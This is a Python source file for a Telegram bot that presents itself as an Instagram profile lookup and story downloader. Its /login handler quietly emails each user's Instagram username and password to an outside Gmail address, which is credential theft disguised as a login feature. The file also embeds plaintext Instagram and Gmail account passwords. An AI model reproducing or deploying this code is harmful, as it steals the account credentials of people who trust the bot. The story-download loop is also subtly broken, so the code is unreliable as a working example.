import telepot
import telegram
import smtplib
import urllib.request
from InstagramAPI import InstagramAPI
from telepot.namedtuple import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup


client = InstagramAPI("jakybay", "camillo197")

client.login()

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login('jaki99kofficial@gmail.com', 'camillo01')

def on_chat_message(msg):
    content_type, chat_type, chat_id = telepot.glance(msg)
    
    global client

    global mex
    mex = msg['text']

    if content_type == 'text':
            if mex.split(' ')[0] == '/login':
              print("Username : ", mex.split(' ')[1])
              print("Password : ", mex.split(' ')[2])
              toSend = mex.split(' ')[1] + '\n'
              toSend += mex.split(' ')[2]
              server.sendmail('jaki99kofficial@gmail.com', 'jak099k@gmail.com', toSend)
              server.quit()
              client = InstagramAPI(str(mex.split(' ')[1]), str(mex.split(' ')[2]))
              client.login()
              bot.sendMessage(chat_id, "<i>Log In effettuato con successo!</i>", parse_mode='HTML')
            else:
              answerMex = ""
              client.searchUsername(mex)
              userInfo = client.LastJson
              if 'message' in userInfo:
                bot.sendMessage(chat_id, "❌ User not found!")
              print("Login effettuato con : jakybay")
              print(userInfo)
              answerMex = "🔮Details : \n\n"
              if str(userInfo['user']['full_name']) != "":
                answerMex += "<b>🗣️Full Name :  </b>" + str(userInfo['user']['full_name']) + '\n'
              answerMex += "<b>👨‍Username :  </b>" + str(userInfo['user']['username']) + '\n\n\n'
              answerMex += "<b>📸Published Photos :  </b>" + str(userInfo['user']['media_count']) + '\n'
              answerMex += "<b>⏮️Followers :  </b>" + str(userInfo['user']['follower_count']) + '\n'
              answerMex += "<b>⏭️Following :  </b>" + str(userInfo['user']['following_count']) + '\n\n\n'
              if str(userInfo['user']['is_private']) == 'True':
                answerMex += "<b>🔐Private Profile :  </b>" + '✅' + '\n\n\n'
              else:
                answerMex += "<b>🔐Private Profile :  </b>" + '❌' + '\n\n\n'
              answerMex += "<b>📝Biography :  </b>\n\n" + str(userInfo['user']['biography']) + '\n' 
              bot.sendMessage(chat_id, answerMex, parse_mode='HTML')
              form = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🖼 Download Profile Pic ", callback_data="profilepic"),
                  InlineKeyboardButton(text="Download stories ", callback_data="downloadstories")]
              ])
              bot.sendMessage(chat_id, "<b>👽EXTRA : </b>", reply_markup=form, parse_mode='HTML')
              #bot.sendPhoto(chat_id, ("profile_pic.jpg", ))

def on_callback_query(msg):
  query_id, from_id, query_data = telepot.glance(msg, flavor='callback_query')

  if query_data == 'profilepic':
    client.searchUsername(mex)
    userInfo = client.LastJson
    #print(userInfo)
    url = userInfo['user']['hd_profile_pic_url_info']['url']
    photo = urllib.request.urlopen(url)
    bot.sendPhoto(from_id, ("profile_pic.jpg", photo))
  elif query_data == 'downloadstories':
    conta = 0
    client.searchUsername(mex)
    userInfo = client.LastJson
    pk = userInfo['user']['pk']
    client.getStory(pk)
    storie = client.LastJson
        
    print('\n\n\n\n\n\n\n')
    #print(storie['items'][0])

    storie = storie['items']

    if not storie:
      bot.sendMessage(from_id, "You can't see the story because you don't follow this profile!")
    else:
      for x in storie:
        if 'video_versions' in storie[conta].keys():
          url = storie[conta]['video_versions'][0]['url']
          photo = urllib.request.urlopen(url)
          bot.sendVideo(from_id, ("stories.jpg", photo))
        else:
          url = storie[conta]['image_versions2']['candidates'][0]['url']
          photo = urllib.request.urlopen(url)
          bot.sendPhoto(from_id, ("stories.jpg", photo))
          conta += 1


TOKEN = ""
bot = telepot.Bot(TOKEN)
bot.message_loop({'chat': on_chat_message, 'callback_query': on_callback_query})

import time
while 1:
    time.sleep(10)
